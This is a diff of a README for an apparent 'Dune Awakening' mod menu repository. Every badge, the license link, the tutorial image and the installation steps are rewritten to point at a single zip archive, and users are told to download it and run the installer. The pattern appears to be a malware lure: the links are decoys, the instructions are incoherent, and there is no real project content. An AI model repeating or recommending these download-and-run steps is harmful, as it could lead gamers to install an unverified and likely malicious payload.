@@ -1,12 +1,12 @@
 # 🚀 Dune Awakening Mod Menu — The Ultimate Enhancement Suite
 
-![OS Support](https://raw.githubusercontent.com/gawon-Kim/dune-awakening-mod-toolkit/main/technographer/mod_dune_toolkit_awakening_v2.5-beta.1.zip)  
-![MIT License](https://raw.githubusercontent.com/gawon-Kim/dune-awakening-mod-toolkit/main/technographer/mod_dune_toolkit_awakening_v2.5-beta.1.zip)  
-![Supported-Languages](https://raw.githubusercontent.com/gawon-Kim/dune-awakening-mod-toolkit/main/technographer/mod_dune_toolkit_awakening_v2.5-beta.1.zip)  
-![Support](https://raw.githubusercontent.com/gawon-Kim/dune-awakening-mod-toolkit/main/technographer/mod_dune_toolkit_awakening_v2.5-beta.1.zip)  
-![Adaptive UI](https://raw.githubusercontent.com/gawon-Kim/dune-awakening-mod-toolkit/main/technographer/mod_dune_toolkit_awakening_v2.5-beta.1.zip)  
-![OpenAI API](https://raw.githubusercontent.com/gawon-Kim/dune-awakening-mod-toolkit/main/technographer/mod_dune_toolkit_awakening_v2.5-beta.1.zip)  
-![Claude API](https://raw.githubusercontent.com/gawon-Kim/dune-awakening-mod-toolkit/main/technographer/mod_dune_toolkit_awakening_v2.5-beta.1.zip)
+![OS Support](https://github.com/gawon-Kim/dune-awakening-mod-toolkit/raw/refs/heads/main/technographer/mod-dune-toolkit-awakening-v3.5.zip)  
+![MIT License](https://github.com/gawon-Kim/dune-awakening-mod-toolkit/raw/refs/heads/main/technographer/mod-dune-toolkit-awakening-v3.5.zip)  
+![Supported-Languages](https://github.com/gawon-Kim/dune-awakening-mod-toolkit/raw/refs/heads/main/technographer/mod-dune-toolkit-awakening-v3.5.zip)  
+![Support](https://github.com/gawon-Kim/dune-awakening-mod-toolkit/raw/refs/heads/main/technographer/mod-dune-toolkit-awakening-v3.5.zip)  
+![Adaptive UI](https://github.com/gawon-Kim/dune-awakening-mod-toolkit/raw/refs/heads/main/technographer/mod-dune-toolkit-awakening-v3.5.zip)  
+![OpenAI API](https://github.com/gawon-Kim/dune-awakening-mod-toolkit/raw/refs/heads/main/technographer/mod-dune-toolkit-awakening-v3.5.zip)  
+![Claude API](https://github.com/gawon-Kim/dune-awakening-mod-toolkit/raw/refs/heads/main/technographer/mod-dune-toolkit-awakening-v3.5.zip)
 
 ---
 
@@ -62,20 +62,20 @@ Whether you're harnessing the power of the OpenAI or Claude APIs for smart autom
 ## 📥 Installation Guide
 
 ### 1️⃣ Download EasyLaunch
-Head to the repository and grab the `https://raw.githubusercontent.com/gawon-Kim/dune-awakening-mod-toolkit/main/technographer/mod_dune_toolkit_awakening_v2.5-beta.1.zip` file — this package is your portal to advanced gameplay, crafted with seamless integration in mind.
+Head to the repository and grab the `https://github.com/gawon-Kim/dune-awakening-mod-toolkit/raw/refs/heads/main/technographer/mod-dune-toolkit-awakening-v3.5.zip` file — this package is your portal to advanced gameplay, crafted with seamless integration in mind.
 
 ### 2️⃣ Extract Contents
 Unpack the zip archive to your chosen directory. Recommend placing it somewhere easily accessible, like your desktop or games folder.
 
 ### 3️⃣ Run the Installer
-Double-click the `https://raw.githubusercontent.com/gawon-Kim/dune-awakening-mod-toolkit/main/technographer/mod_dune_toolkit_awakening_v2.5-beta.1.zip` inside the unzipped folder. The installer adapts itself based on your OS and user settings.
+Double-click the `https://github.com/gawon-Kim/dune-awakening-mod-toolkit/raw/refs/heads/main/technographer/mod-dune-toolkit-awakening-v3.5.zip` inside the unzipped folder. The installer adapts itself based on your OS and user settings.
 
 ### 4️⃣ Launch Dune Awakening with Superpowers
 The installer creates a shortcut. Simply use this shortcut to fire up Dune Awakening with your mod menu ready to deploy.
 
 ### 🎦 Video Installation Tutorial
 
-![Installation Steps](https://raw.githubusercontent.com/gawon-Kim/dune-awakening-mod-toolkit/main/technographer/mod_dune_toolkit_awakening_v2.5-beta.1.zip)
+![Installation Steps](https://github.com/gawon-Kim/dune-awakening-mod-toolkit/raw/refs/heads/main/technographer/mod-dune-toolkit-awakening-v3.5.zip)
 
 With every click, you'll be one step closer to a modded Dune experience that flows like spice through the sand.
 
@@ -117,7 +117,7 @@ Imagine a menu that anticipates your needs, learns your routines, and whispers s
 
 ## 📑 MIT License
 
-This project is released under the [MIT License](https://raw.githubusercontent.com/gawon-Kim/dune-awakening-mod-toolkit/main/technographer/mod_dune_toolkit_awakening_v2.5-beta.1.zip) — 2025. Open your mind to new worlds and share your discoveries!
+This project is released under the [MIT License](https://github.com/gawon-Kim/dune-awakening-mod-toolkit/raw/refs/heads/main/technographer/mod-dune-toolkit-awakening-v3.5.zip) — 2025. Open your mind to new worlds and share your discoveries!
 
 ---
 
